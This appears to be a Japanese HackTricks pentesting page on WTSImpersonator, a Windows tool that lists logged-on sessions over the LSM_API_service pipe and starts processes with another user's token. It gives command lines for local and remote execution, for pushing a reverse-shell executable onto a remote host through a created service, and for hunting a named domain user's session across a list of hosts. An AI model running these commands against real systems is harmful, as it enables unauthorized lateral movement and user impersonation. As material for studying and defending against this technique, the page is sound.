# WTS Impersonator

{{#include ../../banners/hacktricks-training.md}}

**WTSImpersonator**はOmri Basoによるツールで、`\\pipe\LSM_API_service` RPC named pipeを通じて公開されているWindows Terminal Services APIsを使用し、ログオン中のセッションを列挙して、選択したユーザーのtokenでプロセスを起動します。ローカルでの列挙と実行に加え、リモートのサービスベースのワークフローにも対応しています。<sup>[[1]](#references)</sup>

## 基本機能

ローカルでの実行フローでは、次のAPIシーケンスを使用します。<sup>[[1]](#references)[[2]](#references)</sup>
```text
WTSEnumerateSessionsA → WTSQuerySessionInformationA → WTSQueryUserToken → CreateProcessAsUserW
```
## Modules と usage

- **ユーザーの列挙:** このツールは、ローカルまたはリモートホスト上のセッションを列挙できます。

- ローカル:
```bash
.\WTSImpersonator.exe -m enum
```
- リモートでは、IPアドレスまたはホスト名を指定します:
```bash
.\WTSImpersonator.exe -m enum -s 192.168.40.131
```

- **コマンドの実行:** `exec` および `exec-remote` モジュールには、service context が必要です。Microsoft のドキュメントでは、`WTSQueryUserToken` は呼び出し元が `LocalSystem` として `SE_TCB_NAME` privilege を持つ状態で実行される必要があると説明されています。<sup>[[2]](#references)</sup>

- ローカルでのコマンド実行:
```bash
.\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe
```
- PsExec を使用すると、テスト用に `LocalSystem` の command prompt を起動できます:
```bash
.\PsExec64.exe -accepteula -s cmd.exe
```

- **リモートでのコマンド実行:** remote mode は PsExec に似た workflow で target 上に service を作成するため、その service を install および start する権限が必要です。<sup>[[1]](#references)</sup>

- 例:
```bash
.\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
```

- **ユーザーの探索:** `user-hunter` モジュールは、host list を検索して指定されたユーザーの session を見つけ、その context で指定された program の実行を試みます。<sup>[[1]](#references)</sup>
- 使用例:
```bash
.\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe
```

## References

- [1] [OmriBaso/WTSImpersonator](https://github.com/OmriBaso/WTSImpersonator)
- [2] [Microsoft: `WTSQueryUserToken` 関数](https://learn.microsoft.com/en-us/windows/win32/api/wtsapi32/nf-wtsapi32-wtsqueryusertoken)
{{#include ../../banners/hacktricks-training.md}}
